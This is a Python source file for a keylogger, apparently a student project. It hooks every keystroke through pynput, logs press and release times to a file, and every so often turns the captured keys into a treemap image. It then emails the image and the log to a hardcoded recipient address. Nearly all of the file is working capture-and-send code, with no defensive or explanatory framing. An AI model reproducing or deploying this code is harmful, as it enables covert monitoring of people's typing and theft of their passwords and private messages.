from pynput.keyboard import Listener
from datetime import datetime,time
from os.path import isfile
import threading
import report
import treeMap as tm
from message import sendMail

emisor = "julio.escalon.s@uni.pe"
receptor = "mmesiass@uni.pe"
psw = "colocar_contraseña"
rutaTXT = "press.txt"

class tiempos:
    count=0
    log =""
    captcha=""
    keyword=""
    inicio=""
    fin=""
    txt=""
    pKey=[]
    nombreIMG=""
    rutaIMG = ""
    def __init__(self,tiempo):
        self.tiempo = tiempo
    
    def appendLog(self,string):
        self.log = self.log + string
         
    def recognize(self, key):
        try:
            self.keyword=str(key.char)
            self.pKey.append(self.keyword)
        except AttributeError:
            if key == key.space: self.pKey.append("key.space")
            if key == key.shift: self.pKey.append("key.shift")
            if key == key.tab: self.pKey.append("key.tab")
            if key == key.caps_lock: self.pKey.append("key.caps_lock")
            if key == key.enter: self.pKey.append("key.enter")
            if key == key.backspace: self.pKey.append("key.backspace")
            if key == key.ctrl_l: self.pKey.append("key.ctrl_l")
            if key == key.ctrl_r: self.pKey.append("key.ctrl_r")
            self.keyword = self.pKey[len(self.pKey)-1]
        self.appendLog(" "+self.keyword+" ")    
    
    def pressRecord(self,rt):
        self.captcha=self.keyword+"\t\t\t"+self.inicio+"\t\t"+self.fin
        rt.timing(self.captcha,rt.setName())
        self.captcha=""

    def pressKey(self, key):
        self.recognize(key)
        if self.count==0:
            self.inicio=str(datetime.today())
        self.count=self.count+1

    def leaveKey(self, key):
        self.fin=str(datetime.today())
        self.pressRecord(self.txt)
        self.count=0

    def interrupt4Message(self):
        if(len(self.pKey) > 50):
            lista = tm.toList(self.pKey)
            self.nombreIMG="{}.png".format("KeyLogger["+str(datetime.now().strftime("%Y-%m-%d_%H-%M"))+"]")
            self.rutaIMG=self.nombreIMG
            tm.saveTreeMap(lista,self.nombreIMG)
            sendMail(emisor,receptor,psw,self.nombreIMG,self.rutaIMG,rutaTXT)
            self.pKey=[]
        timer = threading.Timer(self.tiempo,self.interrupt4Message)
        timer.start()

    def start(self,repoTiming):
        self.txt=repoTiming
        keyboard_listener = Listener(self.pressKey, self.leaveKey)
        with keyboard_listener:
            self.interrupt4Message()
            keyboard_listener.join()